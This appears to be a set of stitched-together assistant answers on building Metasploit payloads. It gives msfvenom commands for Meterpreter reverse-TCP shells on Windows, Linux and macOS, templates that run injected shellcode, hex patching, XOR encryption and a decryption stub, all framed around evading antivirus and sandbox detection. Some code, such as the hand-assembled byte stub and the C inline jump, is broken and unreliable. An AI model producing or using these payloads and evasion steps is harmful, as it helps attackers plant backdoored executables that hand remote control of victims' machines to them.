Metasploit's `msfvenom` tool allows you to generate various types of payloads, including shellcode, and then wrap or embed them in executable files (e.g., EXE, ELF, etc.). This process involves using binary templates where the generated shellcode is inserted into pre-structured files, resulting in a functional executable that can run the payload. Here's how this is done:

### **1. Binary Templates Overview**

A binary template is a predefined file structure that has placeholders where shellcode or payloads can be inserted. These templates can be executables, scripts, or other binary formats that Metasploit supports. The templates usually contain some basic instructions, headers, and metadata required to create a valid executable file.

### **2. Using `msfvenom` to Generate Shellcode**

The first step in embedding shellcode into a binary is to generate the shellcode using `msfvenom`. This can be done with a variety of payloads and configurations.

Example:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shellcode.bin
```

This command generates raw shellcode for a Meterpreter reverse TCP payload and outputs it to a file named `shellcode.bin`.

### **3. Selecting a Binary Template**

To create an executable, `msfvenom` uses templates from predefined binary files. These templates can be specified using the `-x` option. If not specified, `msfvenom` may use its default templates.

Example:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x /path/to/template.exe -f exe -o payload.exe
```

In this example:
- `-x /path/to/template.exe` specifies the template executable file.
- `-f exe` tells `msfvenom` to output the final file as an executable (`.exe`).
- `-o payload.exe` specifies the output filename.

### **4. Embedding Shellcode into the Template**

When `msfvenom` creates the final executable, it injects the generated shellcode into the template file. The shellcode is typically inserted at a predefined location or injected in a way that doesn't disrupt the original functionality of the template executable (if any).

The steps involved:
- **Load Template**: `msfvenom` reads the binary template file.
- **Locate Insertion Point**: It identifies where in the binary the shellcode should be placed.
- **Inject Shellcode**: The raw shellcode is inserted into the template at the appropriate location.
- **Adjust Headers/Metadata**: If necessary, `msfvenom` adjusts the binary's headers, entry points, or other metadata to ensure the shellcode will execute when the binary is run.
- **Finalize**: The modified binary is saved as the output file, now containing the embedded payload.

### **5. Example Usage**

Here's a full example where `msfvenom` generates a reverse TCP payload and embeds it into a Windows executable template:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x /usr/share/windows-binaries/exe-template.exe -f exe -o malicious.exe
```

- **Payload**: `windows/meterpreter/reverse_tcp` is used.
- **LHOST & LPORT**: Set to the attacker's IP and listening port.
- **Template**: `/usr/share/windows-binaries/exe-template.exe` is the template executable file.
- **Format**: The output format is an executable (`exe`).
- **Output**: The final file is saved as `malicious.exe`.

### **6. Custom Templates**

If the default templates or provided templates don’t meet your needs, you can create your own templates. This involves creating a valid executable with placeholders for shellcode and using it with the `-x` option in `msfvenom`.

### **7. Considerations**

- **Detection**: The resulting executable may be flagged by antivirus software because it contains malicious shellcode.
- **Obfuscation/Evasion**: To avoid detection, you may need to obfuscate the shellcode or use more advanced techniques to embed the payload in a less detectable way.
- **Execution**: The final binary, when executed, will run the embedded shellcode, leading to the desired payload execution (e.g., creating a reverse shell back to the attacker).

This process allows Metasploit users to create custom executables that contain payloads, making it a powerful tool for penetration testing and red teaming.

## Binary Template Creation

Creating your own binary template for use with `msfvenom` involves several steps. You'll be crafting a valid executable (or another binary format) that includes a placeholder where the shellcode will be injected. Here’s a step-by-step guide:

### 1. **Understand the Structure of a Binary Template**

A binary template is essentially a legitimate executable file with a specific location or placeholder where shellcode can be inserted. The key is ensuring that the binary still functions correctly after the shellcode is injected and that the shellcode is executed when the binary runs.

### 2. **Create a Simple Executable**

You can start by creating a simple C or C++ program that does something basic, like printing a message. This will be your base executable template.

#### Example: Simple C Program
```c
#include <stdio.h>

int main() {
    printf("This is a simple template.\n");
    return 0;
}
```

Compile this program to generate an executable:
```bash
gcc -o template.exe template.c
```

This `template.exe` file will serve as the basis for your template.

### 3. **Identify a Placeholder for Shellcode**

You need to modify your simple executable so that it contains a placeholder for the shellcode. There are a few ways to do this:

- **Static Buffer**: Declare a buffer of a fixed size in your program where the shellcode will be injected.
- **NOP Sled**: Fill part of your binary with NOP (No Operation) instructions (`0x90` in x86 assembly), which can be overwritten with shellcode.

#### Example: Adding a Static Buffer
Modify your C program to include a buffer that will serve as the placeholder:

```c
#include <stdio.h>

int main() {
    unsigned char shellcode[256];  // Buffer to hold shellcode (256 bytes)
    
    // Simple message to indicate the template is running
    printf("This is a template. Shellcode will be injected here.\n");
    
    // Trigger for shellcode execution (this can be overwritten by the injected shellcode)
    ((void(*)())shellcode)();
    
    return 0;
}
```

Recompile the program:
```bash
gcc -o template.exe template.c
```

### 4. **Prepare the Template**

Ensure that your executable is correctly structured and that the buffer or placeholder is positioned in the binary where you want to inject the shellcode.

### 5. **Test the Template**

Before using the template with `msfvenom`, you should test the executable to ensure it works correctly without the shellcode. This ensures that the binary will run as expected once the shellcode is injected.

### 6. **Use the Template with `msfvenom`**

Once your template is ready, you can use it with `msfvenom` to inject the shellcode. Here's how you do it:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x template.exe -f exe -o malicious.exe
```

In this command:
- `-x template.exe` specifies your custom template.
- `-f exe` tells `msfvenom` to output the file as an executable.
- `-o malicious.exe` is the name of the final executable with the injected shellcode.

### 7. **Advanced: Modify Entry Points or Add Jump Instructions**

For more advanced use cases, you might want to modify the entry point of your executable to jump to the shellcode or insert a JMP instruction at a specific point in the binary. This requires knowledge of assembly and binary patching.

#### Example: Adding a JMP Instruction
You could modify your template to include a JMP instruction to the buffer where the shellcode will be injected:

```c
#include <stdio.h>

int main() {
    unsigned char shellcode[256];  // Buffer to hold shellcode
    
    // Insert JMP instruction here to jump to shellcode (this is for illustration purposes)
    __asm__("jmp shellcode");
    
    // Simple message to indicate the template is running
    printf("This is a template. Shellcode will be injected here.\n");
    
    return 0;
}
```

### 8. **Final Testing**

After creating the final executable with the shellcode injected, test it in a safe environment (e.g., a VM) to ensure that it executes the shellcode as expected and that the template's original functionality is preserved if needed.

### **Summary**
Creating your own binary template involves:
- Crafting a simple executable with a placeholder for shellcode.
- Compiling and testing the executable.
- Using `msfvenom` to inject shellcode into the template.
- Optionally, modifying entry points or adding jump instructions for more control.

This approach gives you full control over how the shellcode is injected and executed, enabling the creation of highly customized payloads.

Creating customized **msfvenom** binary templates using techniques like binary patching, JMP instructions, and more can be a powerful way to evade detection and create unique payloads for penetration testing. Below is an overview of how you can approach this on Linux, Windows, and macOS.

### **1. Understanding the Basics**

- **msfvenom**: A versatile payload generator provided by Metasploit. It allows you to create shellcode or payloads in various formats.
- **Binary Patching**: Modifying binary files after they've been generated. This can involve changing opcodes, inserting NOPs (No Operation instructions), or adding JMP instructions to alter execution flow.
- **JMP Instructions**: Used to change the flow of execution within a program. Common in shellcode to jump over certain parts of code or to insert custom logic.

### **2. Creating a Payload with msfvenom**

Start by creating a basic payload with `msfvenom`:

```bash
# For Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe -o shell.exe

# For Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f elf -o shell.elf

# For macOS
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f macho -o shell.macho
```

### **3. Disassemble the Binary**

To modify the binary, you first need to disassemble it. Tools like **Ghidra**, **Radare2**, **objdump**, or **IDA Pro** can be used:

```bash
# Using objdump
objdump -D -M intel shell.elf > shell.asm
```

Examine the output to locate where you might want to insert your custom JMP instructions or modify the shellcode.

### **4. Binary Patching with JMP Instructions**

You can manually insert a JMP instruction into the payload to alter its flow. The general steps are:

1. **Identify the Injection Point**: Locate where you want to insert the JMP in the disassembled code. This could be before the payload starts, after initialization, or within the shellcode.

2. **Calculate Offsets**: JMP instructions require you to calculate the correct offset to jump to. For example, `JMP SHORT` can jump up to 127 bytes forward or 128 bytes backward.

3. **Patch the Binary**: You can use a hex editor (like `HexFiend` for macOS or `HxD` for Windows) to manually patch the binary.

   Example:
   - Convert your desired JMP instruction to hex.
   - Insert it into the desired location in the binary.

   For a simple example:
   - If you want to skip the first 5 bytes, you might insert `EB 05` (JMP 5 bytes forward) followed by `90 90 90 90 90` (NOP sled).

### **5. Customizing the Payload**

You might also want to insert custom shellcode or logic. You can append or prepend your custom instructions or replace existing ones.

- **NOP Sled**: Often used to ensure the execution reaches your custom code.
- **Shellcode Insertion**: You can create custom shellcode (e.g., a message box, or adding another backdoor) and insert it at a calculated offset.

### **6. Automating the Process**

You can create scripts to automate binary patching:

**Python Script Example** (for ELF binaries):

```python
with open("shell.elf", "rb") as f:
    content = bytearray(f.read())

# Insert JMP at a specific offset (e.g., offset 0x100)
# EB 05 = JMP 5 bytes forward, followed by 5 NOPs
content[0x100:0x106] = b'\xEB\x05\x90\x90\x90\x90\x90'

# Save the modified binary
with open("patched_shell.elf", "wb") as f:
    f.write(content)
```

### **7. Testing the Modified Binary**

Run the modified binary in a controlled environment to ensure it behaves as expected. Use a debugger to step through the code if necessary to verify that your JMP instructions and patches are working correctly.

### **8. Evading Detection**

Creating customized binaries is also about evading detection. Consider adding:

- **Obfuscation**: Obfuscate the payload to avoid static analysis.
- **Encryption**: Encrypt parts of the payload that are decrypted during runtime.
- **Environment Checks**: Add checks for sandbox or analysis environments and only execute if certain conditions are met.

### **9. Finalizing and Deploying**

Once your customized binary is tested and functional, you can deploy it as part of your penetration testing framework. Always ensure you have proper authorization before using such tools in real environments.

---

This approach to creating customized msfvenom binary templates using binary patching and JMP instructions can help create more sophisticated payloads that might evade standard detection methods. Always conduct such activities ethically and legally.

Certainly! Below are examples for customizing **msfvenom** binaries on **macOS** and **Windows** using binary patching and JMP instructions.

### **1. macOS Example**

#### **Step 1: Generate the msfvenom Payload**

First, create a basic **macOS** payload:

```bash
msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f macho -o shell.macho
```

#### **Step 2: Disassemble the Binary**

Use `objdump` or `otool` to disassemble the binary and inspect the code:

```bash
# Using otool
otool -tV shell.macho > shell.asm
```

#### **Step 3: Identify an Injection Point**

Find a suitable place in the disassembly where you can insert a JMP instruction. Let's say you want to jump over the first few bytes of the shellcode.

#### **Step 4: Patch the Binary**

You can manually insert a JMP instruction to skip the first 5 bytes of the shellcode.

1. **Hex Editor**: Use a hex editor (e.g., Hex Fiend) to open `shell.macho`.
2. **JMP Instruction**: 
   - A typical `JMP SHORT` instruction is `EB`, followed by the number of bytes to jump over. 
   - If you want to skip 5 bytes, you can insert `EB 05`.

   So, you might replace the first few bytes like this:
   
   - Original: `48 31 C0 ...`
   - Patched: `EB 05 90 90 90 ...` (JMP 5 bytes forward, then NOP sled)

3. **Save the Patched File**: Save the modified binary as `patched_shell.macho`.

#### **Step 5: Test the Patched Binary**

Run the binary on a test macOS system to ensure it behaves as expected:

```bash
./patched_shell.macho
```

You can also use a debugger like `lldb` to step through the execution:

```bash
lldb ./patched_shell.macho
```

### **2. Windows Example**

#### **Step 1: Generate the msfvenom Payload**

Create a basic **Windows** payload:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe -o shell.exe
```

#### **Step 2: Disassemble the Binary**

Use a tool like `IDA Pro`, `Ghidra`, or `objdump` to disassemble the binary:

```bash
# Using objdump (for quick analysis)
objdump -D -M intel shell.exe > shell.asm
```

#### **Step 3: Identify an Injection Point**

Identify a place in the disassembly where you can insert your JMP instruction. This could be at the entry point or after initialization code.

#### **Step 4: Patch the Binary**

Use a hex editor like **HxD** (on Windows) to patch the binary.

1. **Hex Editor**: Open `shell.exe` in HxD.
2. **JMP Instruction**:
   - Insert a `JMP` instruction to skip over the first 5 bytes (if that’s where you want to insert it).
   - Replace the first few bytes like this:
   
   - Original: `48 31 C0 ...`
   - Patched: `EB 05 90 90 90 ...` (JMP 5 bytes forward, then NOP sled)

3. **Save the Patched File**: Save the modified binary as `patched_shell.exe`.

#### **Step 5: Test the Patched Binary**

Run the binary on a test Windows machine:

```cmd
patched_shell.exe
```

Alternatively, you can use `x64dbg` or `OllyDbg` to step through the binary’s execution:

```cmd
x64dbg.exe patched_shell.exe
```

### **Additional Tips:**

- **NOP Sleds**: Use NOPs (`0x90` in x86/x64) to ensure the binary doesn’t crash after the JMP instruction.
- **Obfuscation**: Consider obfuscating parts of the payload to further evade detection.
- **Error Checking**: Use debuggers to carefully step through the binary and ensure it behaves as expected after modification.

### **Testing and Debugging**

- Always test your patched binaries in a controlled environment to avoid unintended consequences.
- Use debuggers (`lldb` for macOS, `x64dbg` for Windows) to verify the JMP instructions work correctly.

These examples demonstrate basic binary patching techniques for **macOS** and **Windows** binaries created with `msfvenom`. With these skills, you can create more customized and potentially less detectable payloads for penetration testing purposes.

Obfuscating a payload can be critical for evading detection and making reverse engineering more difficult. There are several ways to obfuscate a payload, and adding decryption routines is one of the most effective techniques. Let's go through how you can obfuscate a payload further, including the use of decryption routines.

### **1. General Techniques for Obfuscation**

#### **a. Encoding and Encryption**

- **XOR Encoding**: A simple yet effective method where the payload is XORed with a key. During execution, the payload is decoded back to its original form.
  
- **AES/RSA Encryption**: Encrypt the payload using a strong encryption algorithm. The encrypted payload is stored, and during runtime, it is decrypted before execution.

- **Base64 Encoding**: Encode the payload in Base64. This is simpler and less secure but still useful for basic obfuscation.

#### **b. Insertion of Junk Code**

- Add non-functional instructions (like NOPs) or random operations that don’t alter the logic of the code but increase its size and complexity, making it harder to analyze.

- **NOP Sleds**: Insert NOP instructions (`0x90`) throughout the code to make it more difficult to locate actual instructions.

#### **c. Instruction Substitution**

- Replace simple instructions with equivalent sequences of instructions that perform the same task but look different. For example, replacing `MOV` with a sequence of `PUSH` and `POP`.

### **2. Adding Decryption Routines**

Adding decryption routines to a payload involves creating an encrypted version of your shellcode and a corresponding decryption routine that runs at the start of execution to decrypt the payload.

#### **a. Should the Decryption Routine be Pre-Existing or Added via Patching?**

- **Pre-Existing Routine**: Ideally, you would include the decryption routine as part of the payload when generating it with a tool like `msfvenom`. This allows for more complex and integrated encryption/decryption schemes.
  
- **Patching the Routine**: You can manually add a decryption routine via binary patching. This is more challenging and requires precise control over the binary.

### **3. Implementing the Decryption Routine**

#### **a. Generating Encrypted Payload with msfvenom**

Here’s an example using XOR encryption:

1. **Generate the Payload**:
   ```bash
   msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f raw -o shellcode.bin
   ```

2. **Encrypt the Payload**:
   Use a simple script to XOR the payload:
   ```python
   key = 0xAA  # Example XOR key
   with open("shellcode.bin", "rb") as f:
       shellcode = bytearray(f.read())

   encrypted_shellcode = bytearray([b ^ key for b in shellcode])

   with open("encrypted_shellcode.bin", "wb") as f:
       f.write(encrypted_shellcode)
   ```

#### **b. Writing a Decryption Routine**

Write a small piece of assembly code that decrypts the payload. For example, an XOR decryption routine:

```assembly
section .text
global _start

_start:
    xor rsi, rsi        ; Clear RSI (index)
    xor rdi, rdi        ; Clear RDI (counter)
    mov rcx, <payload_size> ; Set RCX to the length of the payload
    mov rbx, <encrypted_payload_address> ; Load the address of the encrypted payload
    mov al, 0xAA        ; Set the XOR key (same as used for encryption)

decrypt_loop:
    xor byte [rbx + rdi], al ; XOR decrypt each byte
    inc rdi             ; Move to the next byte
    loop decrypt_loop   ; Loop until the entire payload is decrypted

    jmp rbx             ; Jump to the start of the decrypted payload
```

#### **c. Integrating the Decryption Routine**

You have two options:

1. **Prepend to the Binary**: You can prepend the decryption routine to the existing binary using tools like `cat` (for Linux) or other binary manipulation tools.
   
2. **Patch the Binary**:
   - **Hex Editing**: Open the binary in a hex editor and manually insert the decryption code at the start or at a strategic point in the binary.
   - **Binary Insertion**: Use a script to insert the decryption routine into the binary.

#### **d. Test and Debug**

After adding the decryption routine:

- **Test the Binary**: Run it on a test machine to ensure it decrypts and executes correctly.
- **Debugging**: Use a debugger to step through the decryption process to verify that it works as expected.

### **4. Automating the Process**

To automate the process, you can write a script that:

1. **Encrypts the Payload**: Automatically encrypts the payload after generating it with msfvenom.
2. **Inserts the Decryption Routine**: Patches the binary with the decryption routine.
3. **Tests**: Optionally, runs the payload in a controlled environment to ensure it works.

### **5. Advanced Obfuscation Techniques**

- **Polymorphic Shellcode**: Generates different versions of the same payload by altering the encryption/decryption method or instruction set, making each instance unique.
- **Metamorphic Shellcode**: Self-altering code that changes its structure each time it runs, further complicating detection.
- **Inline Decryption**: Embed decryption routines within the payload itself, dynamically decrypting parts of the code as it executes.

### **Example Python Script to Automate the Process**

Here’s an example of automating the XOR encryption and patching process:

```python
import struct

def xor_encrypt(shellcode, key):
    return bytearray([b ^ key for b in shellcode])

def create_decryption_stub(payload_address, payload_size, key):
    # Assemble a simple decryption stub for 64-bit Windows/Linux
    return b"\x48\x31\xf6" + b"\x48\x31\xff" + struct.pack('<I', payload_size) + struct.pack('<Q', payload_address) + b"\xb0" + struct.pack('B', key) + b"\x48\x31\xc0" + b"\x80\x30" + b"\x48\xff\xc7" + b"\x48\xff\xc7" + b"\xeb\xec\x48\xff\xe3"

def patch_binary(binary_path, stub, offset):
    with open(binary_path, "rb+") as f:
        content = bytearray(f.read())
        content[offset:offset + len(stub)] = stub
        f.seek(0)
        f.write(content)

# Example usage
shellcode_path = "shellcode.bin"
binary_path = "patched_shell.exe"
key = 0xAA

with open(shellcode_path, "rb") as f:
    shellcode = bytearray(f.read())

encrypted_shellcode = xor_encrypt(shellcode, key)
decryption_stub = create_decryption_stub(0x400000, len(shellcode), key)

patch_binary(binary_path, decryption_stub, 0x100)  # Patching at offset 0x100

print("Binary patched successfully.")
```

This script:
1. **Encrypts the shellcode** using XOR.
2. **Creates a decryption stub** with the appropriate memory address and size.
3. **Patches the binary** by inserting the decryption stub at a specified offset.

### **Conclusion**

Obfuscating payloads by adding decryption routines and employing binary patching can make your payloads much harder to detect and analyze. The process involves generating an encrypted payload, writing a decryption routine, and then inserting that routine into the payload, either during generation or through binary patching. This approach, combined with other obfuscation techniques, can significantly improve the stealth of your payloads during penetration testing.
